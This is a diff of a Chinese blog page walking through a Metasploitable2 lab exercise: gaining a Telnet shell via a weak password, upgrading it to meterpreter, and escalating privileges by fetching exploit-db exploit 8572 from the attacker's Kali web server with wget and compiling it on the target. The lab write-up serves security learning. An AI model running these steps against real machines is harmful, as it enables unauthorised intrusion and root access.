@@ -22,7 +22,7 @@
 <meta property="og:image" content="http://yoursite.com/images/telnet1.png">
 <meta property="og:image" content="http://yoursite.com/images/telnet2.png">
 <meta property="og:image" content="http://yoursite.com/images/telnet3.png">
-<meta property="og:updated_time" content="2020-05-03T06:30:28.167Z">
+<meta property="og:updated_time" content="2020-05-03T06:33:56.520Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Metasploitable2系列练习-漏洞利用之Telnet的登录提权">
 <meta name="twitter:description" content="继续上一篇的内容，本次使用的是Telnet的弱密码和登录提权。">
@@ -212,7 +212,8 @@
 <p>这个只是获取的msfadmin权限的shell，我们可以用sessions -u [id]把相应的连接设置成<strong>meterpreter shell</strong></p>
 <p><img src="\images\telnet2.png" alt=""></p>
 <p><strong>meterpreter shell</strong>是一种高级、隐蔽、多层面的且可动态扩展的payload，可以将反射dll注入到目标主机的内存中，还可以在运行时动态加载脚本和插件来进行后渗透利用。包括提权、转存系统账号、键盘记录、持久后门服务、启用远程桌面等，还有很多其他的扩展。而且，<strong>meterpreter</strong> shell的整个通信都是默认加密的。</p>
-<h3 id="利用exp提权"><a href="#利用exp提权" class="headerlink" title="利用exp提权"></a>利用exp提权</h3><p>从<a href="https://www.exploit-db.com/download/8572下载exp，放到kali的/var/www/html目录下，并将下载的C文件chmod" target="_blank" rel="noopener">https://www.exploit-db.com/download/8572下载exp，放到kali的/var/www/html目录下，并将下载的C文件chmod</a> 777 </p>
+<h3 id="利用exp提权"><a href="#利用exp提权" class="headerlink" title="利用exp提权"></a>利用exp提权</h3><p>从 <a href="https://www.exploit-db.com/download/8572" target="_blank" rel="noopener">https://www.exploit-db.com/download/8572</a></p>
+<p>下载exp，放到kali的/var/www/html目录下，并将下载的C文件chmod 777 </p>
 <p>然后开启apache服务：service apache2 start</p>
 <p>然后切换到靶机telnet，从kali下载提权代码并编译：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msfadmin@metasploitable:~$ wget 192.168.52.134/test.c</span><br><span class="line">--22:00:56--  http://192.168.52.134/test.c</span><br><span class="line">           =&gt; `test.c<span class="string">'</span></span><br><span class="line"><span class="string">Connecting to 192.168.52.134:80... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 2,902 (2.8K) [text/x-csrc]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[=======================================================================&gt;] 2,902         --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">22:00:56 (566.80 KB/s) - `test.c'</span> saved [2902/2902]</span><br><span class="line"></span><br><span class="line">msfadmin@metasploitable:~$ ls</span><br><span class="line">test.c	vulnerable</span><br><span class="line">msfadmin@metasploitable:~$ gcc -o exploit test.c</span><br></pre></td></tr></table></figure>
